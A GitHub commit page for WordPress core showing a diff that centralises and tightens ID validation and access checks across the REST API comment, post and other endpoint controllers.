=== Content from github.com_47e9babd_20250125_223720.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FWordPress%2FWordPress%2Fcommit%2Fe357195ce303017d517aff944644a7a1232926f7)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FWordPress%2FWordPress%2Fcommit%2Fe357195ce303017d517aff944644a7a1232926f7)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=WordPress%2FWordPress)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[WordPress](/WordPress)
/
**[WordPress](/WordPress/WordPress)**
Public

* [Notifications](/login?return_to=%2FWordPress%2FWordPress) You must be signed in to change notification settings
* [Fork
  12.7k](/login?return_to=%2FWordPress%2FWordPress)
* [Star
   19.8k](/login?return_to=%2FWordPress%2FWordPress)

* [Code](/WordPress/WordPress)
* [Pull requests
  0](/WordPress/WordPress/pulls)
* [Actions](/WordPress/WordPress/actions)
* [Security](/WordPress/WordPress/security)
* [Insights](/WordPress/WordPress/pulse)

Additional navigation options

* [Code](/WordPress/WordPress)
* [Pull requests](/WordPress/WordPress/pulls)
* [Actions](/WordPress/WordPress/actions)
* [Security](/WordPress/WordPress/security)
* [Insights](/WordPress/WordPress/pulse)

## Commit

[Permalink](/WordPress/WordPress/commit/e357195ce303017d517aff944644a7a1232926f7)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

REST API: Unify object access handling for simplicity.

[Browse files](/WordPress/WordPress/tree/e357195ce303017d517aff944644a7a1232926f7)
Browse the repository at this point in the history

```
Rather than repeating ourselves, unifying the access into a single method keeps everything tidy. While we're at it, add in additional schema handling for common parameters.

See #38792.
Built from [https://develop.svn.wordpress.org/trunk@39954](https://develop.svn.wordpress.org/trunk%4039954)

git-svn-id: [http://core.svn.wordpress.org/trunk@39891](http://core.svn.wordpress.org/trunk%4039891) 1a063a9b-81f0-0310-95a4-ce76da25c4cd
```

* Loading branch information

[![@joehoyle](https://avatars.githubusercontent.com/u/161683?s=40&v=4)](/joehoyle)

[joehoyle](/WordPress/WordPress/commits?author=joehoyle "View all commits by joehoyle")
committed
Jan 26, 2017

1 parent
[8538429](/WordPress/WordPress/commit/85384297a60900004e27e417eac56d24267054cb)

commit e357195

 Show file tree

 Hide file tree

Showing
**10 changed files**
with
**353 additions**
and
**149 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* wp-includes

  + wp-includes/rest-api.php
    [rest-api.php](#diff-92fb957641ab31dd02d924a3fd05c5409a453ed484c879b11b67e4d969bf77d1)
  + rest-api/endpoints

    - wp-includes/rest-api/endpoints/class-wp-rest-comments-controller.php
      [class-wp-rest-comments-controller.php](#diff-c3867acfb64a978d2b0519473f9fbfbc338f49f3ce865f1a128d7043ef2702bc)
    - wp-includes/rest-api/endpoints/class-wp-rest-post-statuses-controller.php
      [class-wp-rest-post-statuses-controller.php](#diff-beca0a2d9da68eea18f34d615a490ae06517ea7f1bbf115843f75460d6099947)
    - wp-includes/rest-api/endpoints/class-wp-rest-post-types-controller.php
      [class-wp-rest-post-types-controller.php](#diff-632018e10fda13c63b5ab379105cea9260a27b0e81ab36da5f0f80597ed2ec7c)
    - wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php
      [class-wp-rest-posts-controller.php](#diff-d9d4b5f316d6e93133aba28d50a2bf43d4981653acb100c3d285c8cc59dfb2ac)
    - wp-includes/rest-api/endpoints/class-wp-rest-revisions-controller.php
      [class-wp-rest-revisions-controller.php](#diff-218dfe49b5ca67ccfa4564471eb982ad5e9006257b152d7405373f9c77dd8dcd)
    - wp-includes/rest-api/endpoints/class-wp-rest-taxonomies-controller.php
      [class-wp-rest-taxonomies-controller.php](#diff-9c4ef99cdd652f50e2ef51b21926cb4fe612bee4b9a9432a7e96bba925261a2a)
    - wp-includes/rest-api/endpoints/class-wp-rest-terms-controller.php
      [class-wp-rest-terms-controller.php](#diff-5590b06efc2a9dcc541af062a87e57b4c054a22b2ae0888ac11ec17364e764cd)
    - wp-includes/rest-api/endpoints/class-wp-rest-users-controller.php
      [class-wp-rest-users-controller.php](#diff-8ad900f383c3af95d3e0d5f4ff4a4afd05cff389f4e61e938f119918aaec4b15)
  + wp-includes/version.php
    [version.php](#diff-e3321c16995a4342da7495e1e3840612b6d91de979b5250c777baf2a40dccfbd)

## There are no files selected for viewing

10 changes: 9 additions & 1 deletion

10
[wp-includes/rest-api.php](#diff-92fb957641ab31dd02d924a3fd05c5409a453ed484c879b11b67e4d969bf77d1 "wp-includes/rest-api.php")

Show comments

[View file](/WordPress/WordPress/blob/e357195ce303017d517aff944644a7a1232926f7/wp-includes/rest-api.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -46,6 +46,13 @@ function register\_rest\_route( $namespace, $route, $args = array(), $override = f |
|  |  | return false; |
|  |  | } |
|  |  |  |
|  |  | if ( isset( $args['args'] ) ) { |
|  |  | $common\_args = $args['args']; |
|  |  | unset( $args['args'] ); |
|  |  | } else { |
|  |  | $common\_args = array(); |
|  |  | } |
|  |  |  |
|  |  | if ( isset( $args['callback'] ) ) { |
|  |  | // Upgrade a single set to multiple. |
|  |  | $args = array( $args ); |
| Expand All | | @@ -57,12 +64,13 @@ function register\_rest\_route( $namespace, $route, $args = array(), $override = f |
|  |  | 'args' => array(), |
|  |  | ); |
|  |  | foreach ( $args as $key => &$arg\_group ) { |
|  |  | if ( ! is\_numeric( $arg\_group ) ) { |
|  |  | if ( ! is\_numeric( $key ) ) { |
|  |  | // Route option, skip here. |
|  |  | continue; |
|  |  | } |
|  |  |  |
|  |  | $arg\_group = array\_merge( $defaults, $arg\_group ); |
|  |  | $arg\_group['args'] = array\_merge( $common\_args, $arg\_group['args'] ); |
|  |  | } |
|  |  |  |
|  |  | $full\_route = '/' . trim( $namespace, '/' ) . '/' . trim( $route, '/' ); |
| Expand Down | |  |

101 changes: 60 additions & 41 deletions

101
[wp-includes/rest-api/endpoints/class-wp-rest-comments-controller.php](#diff-c3867acfb64a978d2b0519473f9fbfbc338f49f3ce865f1a128d7043ef2702bc "wp-includes/rest-api/endpoints/class-wp-rest-comments-controller.php")

Show comments

[View file](/WordPress/WordPress/blob/e357195ce303017d517aff944644a7a1232926f7/wp-includes/rest-api/endpoints/class-wp-rest-comments-controller.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -63,6 +63,12 @@ public function register\_routes() { |
|  |  | ) ); |
|  |  |  |
|  |  | register\_rest\_route( $this->namespace, '/' . $this->rest\_base . '/(?P<id>[\d]+)', array( |
|  |  | 'args' => array( |
|  |  | 'id' => array( |
|  |  | 'description' => \_\_( 'Unique identifier for the object.' ), |
|  |  | 'type' => 'integer', |
|  |  | ), |
|  |  | ), |
|  |  | array( |
|  |  | 'methods' => WP\_REST\_Server::READABLE, |
|  |  | 'callback' => array( $this, 'get\_item' ), |
| Expand Down  Expand Up | | @@ -299,6 +305,36 @@ public function get\_items( $request ) { |
|  |  | return $response; |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Get the comment, if the ID is valid. |
|  |  | \* |
|  |  | \* @since 4.7.2 |
|  |  | \* |
|  |  | \* @param int $id Supplied ID. |
|  |  | \* @return WP\_Comment|WP\_Error Comment object if ID is valid, WP\_Error otherwise. |
|  |  | \*/ |
|  |  | protected function get\_comment( $id ) { |
|  |  | $error = new WP\_Error( 'rest\_comment\_invalid\_id', \_\_( 'Invalid comment ID.' ), array( 'status' => 404 ) ); |
|  |  | if ( (int) $id <= 0 ) { |
|  |  | return $error; |
|  |  | } |
|  |  |  |
|  |  | $id = (int) $id; |
|  |  | $comment = get\_comment( $id ); |
|  |  | if ( empty( $comment ) ) { |
|  |  | return $error; |
|  |  | } |
|  |  |  |
|  |  | if ( ! empty( $comment->comment\_post\_ID ) ) { |
|  |  | $post = get\_post( (int) $comment->comment\_post\_ID ); |
|  |  | if ( empty( $post ) ) { |
|  |  | return new WP\_Error( 'rest\_post\_invalid\_id', \_\_( 'Invalid post ID.' ), array( 'status' => 404 ) ); |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | return $comment; |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Checks if a given request has access to read the comment. |
|  |  | \* |
| Expand All | | @@ -309,12 +345,9 @@ public function get\_items( $request ) { |
|  |  | \* @return WP\_Error|bool True if the request has read access for the item, error object otherwise. |
|  |  | \*/ |
|  |  | public function get\_item\_permissions\_check( $request ) { |
|  |  | $id = (int) $request['id']; |
|  |  |  |
|  |  | $comment = get\_comment( $id ); |
|  |  |  |
|  |  | if ( ! $comment ) { |
|  |  | return true; |
|  |  | $comment = $this->get\_comment( $request['id'] ); |
|  |  | if ( is\_wp\_error( $comment ) ) { |
|  |  | return $comment; |
|  |  | } |
|  |  |  |
|  |  | if ( ! empty( $request['context'] ) && 'edit' === $request['context'] && ! current\_user\_can( 'moderate\_comments' ) ) { |
| Expand Down  Expand Up | | @@ -344,18 +377,9 @@ public function get\_item\_permissions\_check( $request ) { |
|  |  | \* @return WP\_Error|WP\_REST\_Response Response object on success, or error object on failure. |
|  |  | \*/ |
|  |  | public function get\_item( $request ) { |
|  |  | $id = (int) $request['id']; |
|  |  |  |
|  |  | $comment = get\_comment( $id ); |
|  |  | if ( empty( $comment ) ) { |
|  |  | return new WP\_Error( 'rest\_comment\_invalid\_id', \_\_( 'Invalid comment ID.' ), array( 'status' => 404 ) ); |
|  |  | } |
|  |  |  |
|  |  | if ( ! empty( $comment->comment\_post\_ID ) ) { |
|  |  | $post = get\_post( $comment->comment\_post\_ID ); |
|  |  | if ( empty( $post ) ) { |
|  |  | return new WP\_Error( 'rest\_post\_invalid\_id', \_\_( 'Invalid post ID.' ), array( 'status' => 404 ) ); |
|  |  | } |
|  |  | $comment = $this->get\_comment( $request['id'] ); |
|  |  | if ( is\_wp\_error( $comment ) ) { |
|  |  | return $comment; |
|  |  | } |
|  |  |  |
|  |  | $data = $this->prepare\_item\_for\_response( $comment, $request ); |
| Expand Down  Expand Up | | @@ -630,12 +654,12 @@ public function create\_item( $request ) { |
|  |  | \* @return WP\_Error|bool True if the request has access to update the item, error object otherwise. |
|  |  | \*/ |
|  |  | public function update\_item\_permissions\_check( $request ) { |
|  |  | $comment = $this->get\_comment( $request['id'] ); |
|  |  | if ( is\_wp\_error( $comment ) ) { |
|  |  | return $comment; |
|  |  | } |
|  |  |  |
|  |  | $id = (int) $request['id']; |
|  |  |  |
|  |  | $comment = get\_comment( $id ); |
|  |  |  |
|  |  | if ( $comment && ! $this->check\_edit\_permission( $comment ) ) { |
|  |  | if ( ! $this->check\_edit\_permission( $comment ) ) { |
|  |  | return new WP\_Error( 'rest\_cannot\_edit', \_\_( 'Sorry, you are not allowed to edit this comment.' ), array( 'status' => rest\_authorization\_required\_code() ) ); |
|  |  | } |
|  |  |  |
| Expand All | | @@ -652,14 +676,13 @@ public function update\_item\_permissions\_check( $request ) { |
|  |  | \* @return WP\_Error|WP\_REST\_Response Response object on success, or error object on failure. |
|  |  | \*/ |
|  |  | public function update\_item( $request ) { |
|  |  | $id = (int) $request['id']; |
|  |  |  |
|  |  | $comment = get\_comment( $id ); |
|  |  |  |
|  |  | if ( empty( $comment ) ) { |
|  |  | return new WP\_Error( 'rest\_comment\_invalid\_id', \_\_( 'Invalid comment ID.' ), array( 'status' => 404 ) ); |
|  |  | $comment = $this->get\_comment( $request['id'] ); |
|  |  | if ( is\_wp\_error( $comment ) ) { |
|  |  | return $comment; |
|  |  | } |
|  |  |  |
|  |  | $id = $comment->comment\_ID; |
|  |  |  |
|  |  | if ( isset( $request['type'] ) && get\_comment\_type( $id ) !== $request['type'] ) { |
|  |  | return new WP\_Error( 'rest\_comment\_invalid\_type', \_\_( 'Sorry, you are not allowed to change the comment type.' ), array( 'status' => 404 ) ); |
|  |  | } |
| Expand Down  Expand Up | | @@ -750,11 +773,9 @@ public function update\_item( $request ) { |
|  |  | \* @return WP\_Error|bool True if the request has access to delete the item, error object otherwise. |
|  |  | \*/ |
|  |  | public function delete\_item\_permissions\_check( $request ) { |
|  |  | $id = (int) $request['id']; |
|  |  | $comment = get\_comment( $id ); |
|  |  |  |
|  |  | if ( ! $comment ) { |
|  |  | return new WP\_Error( 'rest\_comment\_invalid\_id', \_\_( 'Invalid comment ID.' ), array( 'status' => 404 ) ); |
|  |  | $comment = $this->get\_comment( $request['id'] ); |
|  |  | if ( is\_wp\_error( $comment ) ) { |
|  |  | return $comment; |
|  |  | } |
|  |  |  |
|  |  | if ( ! $this->check\_edit\_permission( $comment ) ) { |
| Expand All | | @@ -773,15 +794,13 @@ public function delete\_item\_permissions\_check( $request ) { |
|  |  | \* @return WP\_Error|WP\_REST\_Response Response object on success, or error object on failure. |
|  |  | \*/ |
|  |  | public function delete\_item( $request ) { |
|  |  | $id = (int) $request['id']; |
|  |  | $force = isset( $request['force'] ) ? (bool) $request['force'] : false; |
|  |  |  |
|  |  | $comment = get\_comment( $id ); |
|  |  |  |
|  |  | if ( empty( $comment ) ) { |
|  |  | return new WP\_Error( 'rest\_comment\_invalid\_id', \_\_( 'Invalid comment ID.' ), array( 'status' => 404 ) ); |
|  |  | $comment = $this->get\_comment( $request['id'] ); |
|  |  | if ( is\_wp\_error( $comment ) ) { |
|  |  | return $comment; |
|  |  | } |
|  |  |  |
|  |  | $force = isset( $request['force'] ) ? (bool) $request['force'] : false; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Filters whether a comment can be trashed. |
|  |  | \* |
| Expand Down | |  |

6 changes: 6 additions & 0 deletions

6
[wp-includes/rest-api/endpoints/class-wp-rest-post-statuses-controller.php](#diff-beca0a2d9da68eea18f34d615a490ae06517ea7f1bbf115843f75460d6099947 "wp-includes/rest-api/endpoints/class-wp-rest-post-statuses-controller.php")

Show comments

[View file](/WordPress/WordPress/blob/e357195ce303017d517aff944644a7a1232926f7/wp-includes/rest-api/endpoints/class-wp-rest-post-statuses-controller.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -48,6 +48,12 @@ public function register\_routes() { |
|  |  | ) ); |
|  |  |  |
|  |  | register\_rest\_route( $this->namespace, '/' . $this->rest\_base . '/(?P<status>[\w-]+)', array( |
|  |  | 'args' => array( |
|  |  | 'status' => array( |
|  |  | 'description' => \_\_( 'An alphanumeric identifier for the status.' ), |
|  |  | 'type' => 'string', |
|  |  | ), |
|  |  | ), |
|  |  | array( |
|  |  | 'methods' => WP\_REST\_Server::READABLE, |
|  |  | 'callback' => array( $this, 'get\_item' ), |
| Expand Down | |  |

6 changes: 6 additions & 0 deletions

6
[wp-includes/rest-api/endpoints/class-wp-rest-post-types-controller.php](#diff-632018e10fda13c63b5ab379105cea9260a27b0e81ab36da5f0f80597ed2ec7c "wp-includes/rest-api/endpoints/class-wp-rest-post-types-controller.php")

Show comments

[View file](/WordPress/WordPress/blob/e357195ce303017d517aff944644a7a1232926f7/wp-includes/rest-api/endpoints/class-wp-rest-post-types-controller.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -48,6 +48,12 @@ public function register\_routes() { |
|  |  | ) ); |
|  |  |  |
|  |  | register\_rest\_route( $this->namespace, '/' . $this->rest\_base . '/(?P<type>[\w-]+)', array( |
|  |  | 'args' => array( |
|  |  | 'type' => array( |
|  |  | 'description' => \_\_( 'An alphanumeric identifier for the post type.' ), |
|  |  | 'type' => 'string', |
|  |  | ), |
|  |  | ), |
|  |  | array( |
|  |  | 'methods' => WP\_REST\_Server::READABLE, |
|  |  | 'callback' => array( $this, 'get\_item' ), |
| Expand Down | |  |

86 changes: 62 additions & 24 deletions

86
[wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php](#diff-d9d4b5f316d6e93133aba28d50a2bf43d4981653acb100c3d285c8cc59dfb2ac "wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php")

Show comments

[View file](/WordPress/WordPress/blob/e357195ce303017d517aff944644a7a1232926f7/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -88,6 +88,12 @@ public function register\_routes() { |
|  |  | ); |
|  |  | } |
|  |  | register\_rest\_route( $this->namespace, '/' . $this->rest\_base . '/(?P<id>[\d]+)', array( |
|  |  | 'args' => array( |
|  |  | 'id' => array( |
|  |  | 'description' => \_\_( 'Unique identifier for the object.' ), |
|  |  | 'type' => 'integer', |
|  |  | ), |
|  |  | ), |
|  |  | array( |
|  |  | 'methods' => WP\_REST\_Server::READABLE, |
|  |  | 'callback' => array( $this, 'get\_item' ), |
| Expand Down  Expand Up | | @@ -349,6 +355,28 @@ public function get\_items( $request ) { |
|  |  | return $response; |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Get the post, if the ID is valid. |
|  |  | \* |
|  |  | \* @since 4.7.2 |
|  |  | \* |
|  |  | \* @param int $id Supplied ID. |
|  |  | \* @return WP\_Post|WP\_Error Post object if ID is valid, WP\_Error otherwise. |
|  |  | \*/ |
|  |  | protected function get\_post( $id ) { |
|  |  | $error = new WP\_Error( 'rest\_post\_invalid\_id', \_\_( 'Invalid post ID.' ), array( 'status' => 404 ) ); |
|  |  | if ( (int) $id <= 0 ) { |
|  |  | return $error; |
|  |  | } |
|  |  |  |
|  |  | $post = get\_post( (int) $id ); |
|  |  | if ( empty( $post ) || empty( $post->ID ) || $this->post\_type !== $post->post\_type ) { |
|  |  | return $error; |
|  |  | } |
|  |  |  |
|  |  | return $post; |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Checks if a given request has access to read a post. |
|  |  | \* |
| Expand All | | @@ -359,8 +387,10 @@ public function get\_items( $request ) { |
|  |  | \* @return bool|WP\_Error True if the request has read access for the item, WP\_Error object otherwise. |
|  |  | \*/ |
|  |  | public function get\_item\_permissions\_check( $request ) { |
|  |  |  |
|  |  | $post = get\_post( (int) $request['id'] ); |
|  |  | $post = $this->get\_post( $request['id'] ); |
|  |  | if ( is\_wp\_error( $post ) ) { |
|  |  | return $post; |
|  |  | } |
|  |  |  |
|  |  | if ( 'edit' === $request['context'] && $post && ! $this->check\_update\_permission( $post ) ) { |
|  |  | return new WP\_Error( 'rest\_forbidden\_context', \_\_( 'Sorry, you are not allowed to edit this post.' ), array( 'status' => rest\_authorization\_required\_code() ) ); |
| Expand Down  Expand Up | | @@ -428,18 +458,16 @@ public function can\_access\_password\_content( $post, $request ) { |
|  |  | \* @return WP\_REST\_Response|WP\_Error Response object on success, or WP\_Error object on failure. |
|  |  | \*/ |
|  |  | public function get\_item( $request ) { |
|  |  | $id = (int) $request['id']; |
|  |  | $post = get\_post( $id ); |
|  |  |  |
|  |  | if ( empty( $id ) || empty( $post->ID ) || $this->post\_type !== $post->post\_type ) { |
|  |  | return new WP\_Error( 'rest\_post\_invalid\_id', \_\_( 'Invalid post ID.' ), array( 'status' => 404 ) ); |
|  |  | $post = $this->get\_post( $request['id'] ); |
|  |  | if ( is\_wp\_error( $post ) ) { |
|  |  | return $post; |
|  |  | } |
|  |  |  |
|  |  | $data = $this->prepare\_item\_for\_response( $post, $request ); |
|  |  | $response = rest\_ensure\_response( $data ); |
|  |  |  |
|  |  | if ( is\_post\_type\_viewable( get\_post\_type\_object( $post->post\_type ) ) ) { |
|  |  | $response->link\_header( 'alternate', get\_permalink( $id ), array( 'type' => 'text/html' ) ); |
|  |  | $response->link\_header( 'alternate', get\_permalink( $post->ID ), array( 'type' => 'text/html' ) ); |
|  |  | } |
|  |  |  |
|  |  | return $response; |
| Expand All | | @@ -455,6 +483,9 @@ public function get\_item( $request ) { |
|  |  | \* @return true|WP\_Error True if the request has access to create items, WP\_Error object otherwise. |
|  |  | \*/ |
|  |  | public function create\_item\_permissions\_check( $request ) { |
|  |  | if ( ! empty( $request['id'] ) ) { |
|  |  | return new WP\_Error( 'rest\_post\_exists', \_\_( 'Cannot create existing post.' ), array( 'status' => 400 ) ); |
|  |  | } |
|  |  |  |
|  |  | $post\_type = get\_post\_type\_object( $this->post\_type ); |
|  |  |  |
| Expand Down  Expand Up | | @@ -591,8 +622,11 @@ public function create\_item( $request ) { |
|  |  | \* @return true|WP\_Error True if the request has access to update the item, WP\_Error object otherwise. |
|  |  | \*/ |
|  |  | public function update\_item\_permissions\_check( $request ) { |
|  |  | $post = $this->get\_post( $request['id'] ); |
|  |  | if ( is\_wp\_error( $post ) ) { |
|  |  | return $post; |
|  |  | } |
|  |  |  |
|  |  | $post = get\_post( $request['id'] ); |
|  |  | $post\_type = get\_post\_type\_object( $this->post\_type ); |
|  |  |  |
|  |  | if ( $post && ! $this->check\_update\_permission( $post ) ) { |
| Expand Down  Expand Up | | @@ -624,11 +658,9 @@ public function update\_item\_permissions\_check( $request ) { |
|  |  | \* @return WP\_REST\_Response|WP\_Error Response object on success, or WP\_Error object on failure. |
|  |  | \*/ |
|  |  | public function update\_item( $request ) { |
|  |  | $id = (int) $request['id']; |
|  |  | $post = get\_post( $id ); |
|  |  |  |
|  |  | if ( empty( $id ) || empty( $post->ID ) || $this->post\_type !== $post->post\_type ) { |
|  |  | return new WP\_Error( 'rest\_post\_invalid\_id', \_\_( 'Invalid post ID.' ), array( 'status' => 404 ) ); |
|  |  | $valid\_check = $this->get\_post( $request['id'] ); |
|  |  | if ( is\_wp\_error( $valid\_check ) ) { |
|  |  | return $valid\_check; |
|  |  | } |
|  |  |  |
|  |  | $post = $this->prepare\_item\_for\_database( $request ); |
| Expand Down  Expand Up | | @@ -714,8 +746,10 @@ public function update\_item( $request ) { |
|  |  | \* @return true|WP\_Error True if the request has access to delete the item, WP\_Error object otherwise. |
|  |  | \*/ |
|  |  | public function delete\_item\_permissions\_check( $request ) { |
|  |  |  |
|  |  | $post = get\_post( $request['id'] ); |
|  |  | $post = $this->get\_post( $request['id'] ); |
|  |  | if ( is\_wp\_error( $post ) ) { |
|  |  | return $post; |
|  |  | } |
|  |  |  |
|  |  | if ( $post && ! $this->check\_delete\_permission( $post ) ) { |
|  |  | return new WP\_Error( 'rest\_cannot\_delete', \_\_( 'Sorry, you are not allowed to delete this post.' ), array( 'status' => rest\_authorization\_required\_code() ) ); |
| Expand All | | @@ -734,15 +768,14 @@ public function delete\_item\_permissions\_check( $request ) { |
|  |  | \* @return WP\_REST\_Response|WP\_Error Response object on success, or WP\_Error object on failure. |
|  |  | \*/ |
|  |  | public function delete\_item( $request ) { |
|  |  | $id = (int) $request['id']; |
|  |  | $force = (bool) $request['force']; |
|  |  |  |
|  |  | $post = get\_post( $id ); |
|  |  |  |
|  |  | if ( empty( $id ) || empty( $post->ID ) || $this->post\_type !== $post->post\_type ) { |
|  |  | return new WP\_Error( 'rest\_post\_invalid\_id', \_\_( 'Invalid post ID.' ), array( 'status' => 404 ) ); |
|  |  | $post = $this->get\_post( $request['id'] ); |
|  |  | if ( is\_wp\_error( $post ) ) { |
|  |  | return $post; |
|  |  | } |
|  |  |  |
|  |  | $id = $post->ID; |
|  |  | $force = (bool) $request['force']; |
|  |  |  |
|  |  | $supports\_trash = ( EMPTY\_TRASH\_DAYS > 0 ); |
|  |  |  |
|  |  | if ( 'attachment' === $post->post\_type ) { |
| Expand Down  Expand Up | | @@ -901,7 +934,12 @@ protected function prepare\_item\_for\_database( $request ) { |
|  |  |  |
|  |  | // Post ID. |
|  |  | if ( isset( $request['id'] ) ) { |
|  |  | $prepared\_post->ID = absint( $request['id'] ); |
|  |  | $existing\_post = $this->get\_post( $request['id'] ); |
|  |  | if ( is\_wp\_error( $existing\_post ) ) { |
|  |  | return $existing\_post; |
|  |  | } |
|  |  |  |
|  |  | $prepared\_post->ID = $existing\_post->ID; |
|  |  | } |
|  |  |  |
|  |  | $schema = $this->get\_item\_schema(); |
| Expand Down | |  |

 Loading

Oops, something went wrong.
 Retry

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `e357195`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FWordPress%2FWordPress%2Fcommit%2Fe357195ce303017d517aff944644a7a1232926f7) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.openwall.com_bef574e4_20250125_223712.html ===


